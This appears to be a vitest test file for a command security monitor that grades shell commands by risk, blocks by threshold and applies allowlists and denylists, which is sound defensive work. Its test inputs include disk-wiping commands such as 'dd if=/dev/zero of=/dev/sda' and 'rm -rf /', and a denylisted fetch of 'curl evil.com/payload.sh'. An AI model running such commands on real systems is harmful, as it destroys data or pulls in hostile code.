import { describe, expect, it } from "vitest";
import {
  assessCommandRisk,
  createSecurityMonitor,
  type SecurityMonitorConfig,
} from "./security-monitor.js";

describe("assessCommandRisk", () => {
  describe("low risk commands", () => {
    it("classifies ls as low risk", () => {
      const result = assessCommandRisk("ls -la");
      expect(result.level).toBe("low");
      expect(result.blocked).toBe(false);
    });

    it("classifies cat as low risk", () => {
      const result = assessCommandRisk("cat README.md");
      expect(result.level).toBe("low");
    });

    it("classifies grep as low risk", () => {
      const result = assessCommandRisk("grep -r 'test' src/");
      expect(result.level).toBe("low");
    });

    it("classifies echo as low risk", () => {
      const result = assessCommandRisk("echo hello");
      expect(result.level).toBe("low");
    });

    it("classifies pwd as low risk", () => {
      const result = assessCommandRisk("pwd");
      expect(result.level).toBe("low");
    });
  });

  describe("medium risk commands", () => {
    it("classifies unknown commands as medium", () => {
      const result = assessCommandRisk("mycustomtool --flag");
      expect(result.level).toBe("medium");
    });

    it("escalates low risk commands with pipes to medium", () => {
      const result = assessCommandRisk("echo hello | cat");
      expect(result.level).toBe("medium");
    });

    it("escalates low risk commands with redirects to medium", () => {
      const result = assessCommandRisk("echo hello > output.txt");
      expect(result.level).toBe("medium");
    });
  });

  describe("high risk commands", () => {
    it("classifies rm as high risk", () => {
      const result = assessCommandRisk("rm file.txt");
      expect(result.level).toBe("high");
    });

    it("classifies chmod as high risk", () => {
      const result = assessCommandRisk("chmod 777 file.txt");
      expect(result.level).toBe("high");
    });

    it("classifies kill as high risk", () => {
      const result = assessCommandRisk("kill 12345");
      expect(result.level).toBe("high");
    });

    it("escalates to high when targeting system paths", () => {
      const result = assessCommandRisk("cp file.txt /etc/config");
      expect(result.level).toBe("high");
    });

    it("escalates to high when using sudo", () => {
      const result = assessCommandRisk("sudo apt-get install package");
      expect(result.level).toBe("high");
    });
  });

  describe("critical risk commands", () => {
    it("classifies dd as critical", () => {
      const result = assessCommandRisk("dd if=/dev/zero of=/dev/sda");
      expect(result.level).toBe("critical");
    });

    it("classifies mkfs as critical", () => {
      const result = assessCommandRisk("mkfs /dev/sda1");
      expect(result.level).toBe("critical");
    });

    it("classifies rm -rf as critical", () => {
      const result = assessCommandRisk("rm -rf /tmp/test");
      expect(result.level).toBe("critical");
    });

    it("classifies rm -fr as critical", () => {
      const result = assessCommandRisk("rm -fr /tmp/test");
      expect(result.level).toBe("critical");
    });

    it("classifies rm targeting root as critical", () => {
      const result = assessCommandRisk("rm -rf /");
      expect(result.level).toBe("critical");
    });
  });

  describe("blocking", () => {
    it("blocks critical commands with default threshold", () => {
      const result = assessCommandRisk("dd if=/dev/zero of=/dev/sda");
      expect(result.blocked).toBe(true);
    });

    it("does not block high risk with default threshold", () => {
      const result = assessCommandRisk("rm file.txt");
      expect(result.blocked).toBe(false);
    });

    it("blocks high risk when threshold is high", () => {
      const config: SecurityMonitorConfig = {
        threshold: "high",
        allowlist: [],
        denylist: [],
      };
      const result = assessCommandRisk("rm file.txt", config);
      expect(result.blocked).toBe(true);
    });

    it("blocks medium risk when threshold is medium", () => {
      const config: SecurityMonitorConfig = {
        threshold: "medium",
        allowlist: [],
        denylist: [],
      };
      const result = assessCommandRisk("mycustomtool --flag", config);
      expect(result.blocked).toBe(true);
    });
  });

  describe("allowlist and denylist", () => {
    it("allowlist overrides risk assessment", () => {
      const config: SecurityMonitorConfig = {
        threshold: "high",
        allowlist: ["rm -rf node_modules"],
        denylist: [],
      };
      const result = assessCommandRisk("rm -rf node_modules", config);
      expect(result.level).toBe("low");
      expect(result.blocked).toBe(false);
    });

    it("denylist escalates to critical", () => {
      const config: SecurityMonitorConfig = {
        threshold: "critical",
        allowlist: [],
        denylist: ["curl evil.com"],
      };
      const result = assessCommandRisk("curl evil.com/payload.sh", config);
      expect(result.level).toBe("critical");
      expect(result.blocked).toBe(true);
    });

    it("denylist takes priority over allowlist", () => {
      const config: SecurityMonitorConfig = {
        threshold: "critical",
        allowlist: ["curl"],
        denylist: ["curl evil.com"],
      };
      const result = assessCommandRisk("curl evil.com/payload.sh", config);
      expect(result.level).toBe("critical");
    });
  });

  describe("sudo handling", () => {
    it("extracts base command after sudo", () => {
      const result = assessCommandRisk("sudo rm file.txt");
      expect(result.level).toBe("high");
    });

    it("extracts base command after doas", () => {
      const result = assessCommandRisk("doas rm file.txt");
      expect(result.level).toBe("high");
    });
  });

  describe("system path detection", () => {
    for (const sp of ["/etc", "/usr", "/bin", "/sbin", "/boot"]) {
      it(`detects ${sp} as system path`, () => {
        const result = assessCommandRisk(`cp file ${sp}/config`);
        expect(result.level).toBe("high");
      });
    }
  });
});

describe("createSecurityMonitor", () => {
  it("creates a monitor with default config", () => {
    const monitor = createSecurityMonitor();
    expect(monitor.getConfig().threshold).toBe("critical");
  });

  it("records assessments in audit log", () => {
    const monitor = createSecurityMonitor();
    monitor.assess("ls -la");
    monitor.assess("rm file.txt");
    const log = monitor.getAuditLog();
    expect(log).toHaveLength(2);
    expect(log[0].level).toBe("low");
    expect(log[1].level).toBe("high");
  });

  it("allows config updates", () => {
    const monitor = createSecurityMonitor();
    monitor.updateConfig({ threshold: "medium" });
    expect(monitor.getConfig().threshold).toBe("medium");
  });

  it("uses custom config", () => {
    const monitor = createSecurityMonitor({
      threshold: "high",
      denylist: ["dangerous-command"],
    });
    const result = monitor.assess("dangerous-command --flag");
    expect(result.level).toBe("critical");
    expect(result.blocked).toBe(true);
  });
});
